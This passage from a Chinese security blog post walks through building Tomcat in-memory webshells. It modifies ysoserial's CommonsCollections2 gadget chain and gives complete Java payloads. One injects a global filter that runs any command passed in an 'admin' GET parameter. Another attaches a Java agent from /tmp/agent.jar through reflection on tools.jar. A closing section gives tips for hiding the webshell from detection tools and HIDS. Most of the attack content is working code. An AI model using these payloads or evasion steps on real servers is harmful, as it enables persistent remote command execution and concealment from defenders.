title="配置反序列化环境"></a>配置反序列化环境</h3><p>我们写一个进行反序列化的接口，放在<code>doPost()</code>里面，核心代码只需一句</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="keyword">new</span> ObjectInputStream((request.getInputStream()))).readObject();</span><br></pre></td></tr></table></figure><p>我们使用CommonsCollections2作为例子，通过Maven引入<code>commons-collections4:4.0</code></p><p>测试一下环境是否正常</p><p><img src="../../img/JavaWeb-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8A%80%E6%9C%AF%E6%95%B4%E7%90%86/image-20220126194726803.png" alt="image-20220126194726803"></p><p>会报错，但是我们可以发现是<code>TemplatesImpl</code>抛出的，并且检查命令执行效果可以发现命令执行成功了，接下来开始改造Payload</p><h3 id="构造Exploit-1"><a href="#构造Exploit-1" class="headerlink" title="构造Exploit"></a>构造Exploit</h3><p>首先是用IDEA导入ysoserial项目，项目的Jdk版本设置为1.8。</p><p>由于打包起来太麻烦，我们将<code>ysoserial.GeneratePayload</code>作为主类运行，直接生成Payload</p><p>由于我们要输出到文件中，修改<code>GeneraterPayload.java</code>的第35行<code>PrintStream out = System.out;</code>改为<code>PrintStream out = new PrintStream(&quot;./output.serial&quot;);</code></p><p>首先在<code>ysoserial.payloads.util.Gadgets.java</code>中调整<code>createTemplateImpl</code>函数</p><p>由于原版的<code>createTemplateImpl</code>根据要执行的指令来生成<code>TemplateImpl</code>我们将其重载并稍微修改一下    </p><p>我们复制<code>createTemplateImpl</code>并改为如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> Class _class )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( Boolean.parseBoolean(System.getProperty(<span class="string">&quot;properXalan&quot;</span>, <span class="string">&quot;false&quot;</span>)) ) &#123;</span><br><span class="line">        <span class="keyword">return</span> createTemplatesImpl(</span><br><span class="line">            _class,</span><br><span class="line">            Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;</span>),</span><br><span class="line">            Class.forName(<span class="string">&quot;org.apache.xalan.xsltc.trax.TransformerFactoryImpl&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> createTemplatesImpl(_class, TemplatesImpl.class, TransformerFactoryImpl.class);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt; <span class="function">T <span class="title">createTemplatesImpl</span> <span class="params">( <span class="keyword">final</span> Class _class, Class&lt;T&gt; tplClass, Class&lt;?&gt; transFactory )</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="keyword">final</span> T templates = tplClass.newInstance();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">byte</span>[] classBytes = ClassFiles.classAsBytes(_class);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// inject class bytes into instance</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;</span><br><span class="line">        classBytes, ClassFiles.classAsBytes(Foo.class)</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// required to make TemplatesImpl happy</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Pwnr&quot;</span>);</span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, transFactory.newInstance());</span><br><span class="line">    <span class="keyword">return</span> templates;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>对于第一处重载，只是把<code>command</code>改为了<code>_class</code>并删除了无用的参数，第二处重载则从通过Javaassist技术制作类并获取字节码变为直接获取字节码，因为我们直接编写了类文件</p><p>然后将<code>payloads/CommonsCollections2</code>复制出一个新版本，命名为<code>CommonsCollections2ForClassInjection</code></p><p>将<code>command</code>参数重构为<code>payloadName</code>，变为注入的类名来使用，之后可以方便调整为使用<code>ServletInjection</code>等其它内存马</p><p>把这一句进行修改</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(command);</span><br></pre></td></tr></table></figure><p>换为如下，直接通过类名获取字节码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(Class.forName(<span class="string">&quot;ysoserial.shells.&quot;</span>+payloadName));</span><br></pre></td></tr></table></figure><p>启动参数配置如下</p><p><img src="../../img/JavaWeb-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8A%80%E6%9C%AF%E6%95%B4%E7%90%86/image-20220126194823501.png" alt="image-20220126194823501"></p><p>将生成的<code>output.serial</code>文件打到服务器上，然后在访问任意路径时，带上GET参数<code>admin</code>就可以执行命令了</p><p>可以发现我给自己起的Payload名字是<code>TomcatFilterInjection</code>，把它放在如图的位置</p><p><img src="../../img/JavaWeb-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8A%80%E6%9C%AF%E6%95%B4%E7%90%86/image-20220126194842825.png" alt="image-20220126194842825"></p><p>Payload代码如下，大家也可以自己制作<code>ServletInjection</code>或者<code>ListenerInjection</code>作为Payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.shells;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.Context;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterConfig;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterDef;</span><br><span class="line"><span class="keyword">import</span> org.apache.tomcat.util.descriptor.web.FilterMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TomcatFilterInjection</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">            String name = <span class="string">&quot;TomcatFilterInjection&quot;</span>;</span><br><span class="line">            <span class="comment">// 从ContextClassLoader获取StandardContext</span></span><br><span class="line">            WebappClassLoaderBase webappClassLoaderBase =(WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">            StandardContext standardContext = (StandardContext)webappClassLoaderBase.getResources().getContext();</span><br><span class="line">            <span class="comment">// 通过反射从StandardContext获取到filterConfigs</span></span><br><span class="line">            Field field = standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">            field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            Map filterConfigs = (Map) field.get(standardContext);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (filterConfigs.get(name) == <span class="keyword">null</span>) &#123; <span class="comment">// 防止重复注入</span></span><br><span class="line">                TomcatFilterInjection filter = <span class="keyword">new</span> TomcatFilterInjection();</span><br><span class="line">                <span class="comment">// 封装Filter为FilterDef，并添加到StandContext中</span></span><br><span class="line">                FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">                filterDef.setFilterName(name);</span><br><span class="line">                filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">                filterDef.setFilter(filter);</span><br><span class="line">                standardContext.addFilterDef(filterDef);</span><br><span class="line">                <span class="comment">// 生成新的ApplicationFilterConfig并添加到filterConfigs中</span></span><br><span class="line">                Constructor constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">                constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                ApplicationFilterConfig filterConfig = (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line">                filterConfigs.put(name, filterConfig);</span><br><span class="line">                <span class="comment">// 创建FilterMap并加入StandardContext中，为Filter确定适用的URL</span></span><br><span class="line">                FilterMap filterMap = <span class="keyword">new</span> FilterMap();</span><br><span class="line">                filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>); <span class="comment">// 全局生效</span></span><br><span class="line">                filterMap.setFilterName(name);</span><br><span class="line">                filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">                standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="comment">// 忽略错误，在生成生成序列化代码时也会执行static部分，必然报错，直接跳过即可</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest req, ServletResponse res,</span></span></span><br><span class="line"><span class="params"><span class="function">                         FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        HttpServletRequest request = (HttpServletRequest) req;</span><br><span class="line">        <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;admin&quot;</span>)!=<span class="keyword">null</span>)&#123;</span><br><span class="line">            Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;admin&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        filterChain.doFilter(req, res);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Java-Agent内存马"><a href="#Java-Agent内存马" class="headerlink" title="Java Agent内存马"></a>Java Agent内存马</h2><blockquote><p>参考：<a href="https://xz.aliyun.com/t/9450">Java Agent 从入门到内存马 - 先知社区 (aliyun.com)</a></p></blockquote><p>还是以Tomcat为例，我们知道JavaAgent技术可以动态修改字节码，我们熟知的Burp Suite的破解技术就是基于<code>premain</code>方法实现的，通过<code>agentmain</code>，我们可以直接修改关键类即可</p><p>由于Java Agent内存马需要有Jar文件落地，并不是比JSP更好的方法，只能说在JSP无法解析的时候适用性会更好一些</p><p>比较知名的冰蝎就提供了Java Agent内存马，我们也实现一个比较基础的</p><p>调用端(Attacher)的核心代码其实就3句话</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">VirtualMachine virtualMachine = VirtualMachine.attach(id);</span><br><span class="line">virtualMachine.loadAgent(jarName);</span><br><span class="line">virtualMachine.detach();</span><br></pre></td></tr></table></figure><p>我们可以使用前面研究过的JNDI注入方法进行注入，也可以利用反序列化，只要能够执行Java代码即可，甚至拿到系统Shell后直接用命令执行<code>loadAgent</code>的另一个java程序也可以，只是要上传更多的文件，风险更大</p><p>这里方便起见，直接继续使用前面研究的反序列化注入方法进行攻击，我们在<code>shells</code>中增加一个新的Payload，代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.shells;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> sun.management.VMManagement;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.management.ManagementFactory;</span><br><span class="line"><span class="keyword">import</span> java.lang.management.RuntimeMXBean;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentInjection</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 首先获取进程ID</span></span><br><span class="line">            RuntimeMXBean runtime = ManagementFactory.getRuntimeMXBean();</span><br><span class="line">            Field jvm = runtime.getClass().getDeclaredField(<span class="string">&quot;jvm&quot;</span>);</span><br><span class="line">            jvm.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            VMManagement mgmt = (VMManagement) jvm.get(runtime);</span><br><span class="line">            Method pidMethod = mgmt.getClass().getDeclaredMethod(<span class="string">&quot;getProcessId&quot;</span>);</span><br><span class="line">            pidMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            <span class="comment">// attach到当前JVM</span></span><br><span class="line">            VirtualMachine virtualMachine = VirtualMachine.attach(String.valueOf(pidMethod.invoke(mgmt)));</span><br><span class="line">            <span class="comment">// 加载agent，可以从远程下载再load，这里直接从本地load了</span></span><br><span class="line">            virtualMachine.loadAgent(<span class="string">&quot;/tmp/agent.jar&quot;</span>);</span><br><span class="line">            virtualMachine.detach();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>src/main/resources/</code>目录下创建<code>META-INF/MANIFEST.MF</code>，内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Agent-Class: Agent</span><br><span class="line">Can-Retransform-Classes: true</span><br></pre></td></tr></table></figure><p>打包成<code>.jar</code>，发送序列化数据，结果遇到异常</p><p><img src="../../img/JavaWeb-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8A%80%E6%9C%AF%E6%95%B4%E7%90%86/image-20220126195048536.png" alt="image-20220126195048536"></p><p>可以发现依赖于<code>tools.jar</code>，这个包对于Tomcat来说并不会自动加载，为了让攻击奏效，我们可以通过<code>JAVA_HOME</code>路径手动加载类型，通过反射执行相关函数</p><p>修改后的Payload代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.shells;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> sun.management.VMManagement;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.lang.management.ManagementFactory;</span><br><span class="line"><span class="keyword">import</span> java.lang.management.RuntimeMXBean;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentInjection</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 首先获取进程ID</span></span><br><span class="line">            RuntimeMXBean runtime = ManagementFactory.getRuntimeMXBean();</span><br><span class="line">            Field jvm = runtime.getClass().getDeclaredField(<span class="string">&quot;jvm&quot;</span>);</span><br><span class="line">            jvm.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            VMManagement mgmt = (VMManagement) jvm.get(runtime);</span><br><span class="line">            Method pidMethod = mgmt.getClass().getDeclaredMethod(<span class="string">&quot;getProcessId&quot;</span>);</span><br><span class="line">            pidMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            <span class="comment">// 通过反射进行调用</span></span><br><span class="line">            URLClassLoader classLoader = <span class="keyword">new</span> java.net.URLClassLoader(<span class="keyword">new</span> java.net.URL[]&#123;<span class="keyword">new</span> File(System.getProperty(<span class="string">&quot;java.home&quot;</span>).replace(<span class="string">&quot;jre&quot;</span>,<span class="string">&quot;lib&quot;</span>) + File.separator + <span class="string">&quot;tools.jar&quot;</span>).toURI().toURL()&#125;);</span><br><span class="line">            Class&lt;?&gt; VirtualMachine = classLoader.loadClass(<span class="string">&quot;com.sun.tools.attach.VirtualMachine&quot;</span>);</span><br><span class="line">            Method attach = VirtualMachine.getDeclaredMethod(<span class="string">&quot;attach&quot;</span>,<span class="keyword">new</span> Class[]&#123;java.lang.String.class&#125;);</span><br><span class="line">            Method loadAgent=VirtualMachine.getDeclaredMethod(<span class="string">&quot;loadAgent&quot;</span>,<span class="keyword">new</span> Class[]&#123;java.lang.String.class&#125;);</span><br><span class="line">            Method detach=VirtualMachine.getDeclaredMethod(<span class="string">&quot;detach&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">            Object virtualMachine = attach.invoke(VirtualMachine,<span class="keyword">new</span> Object[]&#123;String.valueOf(pidMethod.invoke(mgmt))&#125;);</span><br><span class="line">            loadAgent.invoke(virtualMachine,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;/tmp/agent.jar&quot;</span>&#125;);</span><br><span class="line">            detach.invoke(virtualMachine);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完成反序列化注入Payload后，在访问任意路径时，带上GET参数<code>admin</code>就可以执行命令了</p><h2 id="内存马检测和隐藏"><a href="#内存马检测和隐藏" class="headerlink" title="内存马检测和隐藏"></a>内存马检测和隐藏</h2><blockquote><p>参考：</p><p><a href="https://xz.aliyun.com/t/10562">探索Filter型Tomcat内存马的免杀 - 先知社区 (aliyun.com)</a></p><p><a href="https://gv7.me/articles/2020/kill-java-web-filter-memshell/">查杀Java web filter型内存马 | 回忆飘如雪 (gv7.me)</a></p></blockquote><p>对于注入后的内存马，可以分为两个类型</p><ul><li>组件注入型 - 注入Servlet、Filter、Listener、Controller等</li><li>Agent注入型 - 注入字节码</li></ul><p>检测方面的研究主要有c0ny1师傅的文章</p><h3 id="组件注入型的检测和查杀"><a href="#组件注入型的检测和查杀" class="headerlink" title="组件注入型的检测和查杀"></a>组件注入型的检测和查杀</h3><p>可以发现c0ny1师傅给出的方法就是通过加载Java Agent实时获取所有Filter，并且对于可疑的类进行检查</p><p>根据4ra1n师傅的方法，我们可以主要通过如下手段来隐藏我们的内存马</p><ol><li>内存马的类名改为更加合理的，不要使用<code>BackdoorFilter</code>这样显眼的名字，并引入一定的随机化</li><li>读取已有Filter的包名，将自己Filter包名改为一致的</li><li>自动修改<code>web.xml</code>的内容进行隐藏</li></ol><p>除此之外，由于可以检查Filter对应的classpath是否存在来检查，我们可以把class文件写入到硬盘上，但是这样就有被HIDS扫描到的风险，应视情况采用</p><p>目前为止，如果防御方不把class文件dump出来进行反编译对源码进行分析，应该是很难识别了，如果被dump了的话，只能进一步进采用源码免杀技巧</p><h3 id="Agent注入型的检测和查杀"><a href="#Agent注入型的检测和查杀" class="headerlink" title="Agent注入型的检测和查杀"></a>Agent注入型的检测和查杀</h3><p>由于c0ny1师傅的《查杀Java web Agent型内存马》尚未发布，先留个坑在这里</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文以Tomcat 9为核心学习并归纳了一些内存马技术，除有特殊说明外的章节外，本文使用Java 8u292&lt;/p&gt;</summary>
    
    
    
    <category term="技术归纳" scheme="https://cn.4xpl0r3r.com/categories/%E6%8A%80%E6%9C%AF%E5%BD%92%E7%BA%B3/"/>
    
    
    <category term="Java Web" scheme="https://cn.4xpl0r3r.com/tags/Java-Web/"/>
    
    <category term="内存马" scheme="https://cn.4xpl0r3r.com/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
    <category term="Shell" scheme="https://cn.4xpl0r3r.com/tags/Shell/"/>
    
    <category term="Tomcat" scheme="https://cn.4xpl0r3r.com/tags/Tomcat/"/>
    
    <category term="ysoserial" scheme="https://cn.4xpl0r3r.com/tags/ysoserial/"/>
    
    <category term="JNDI" scheme="https://cn.4xpl0r3r.com/tags/JNDI/"/>
    
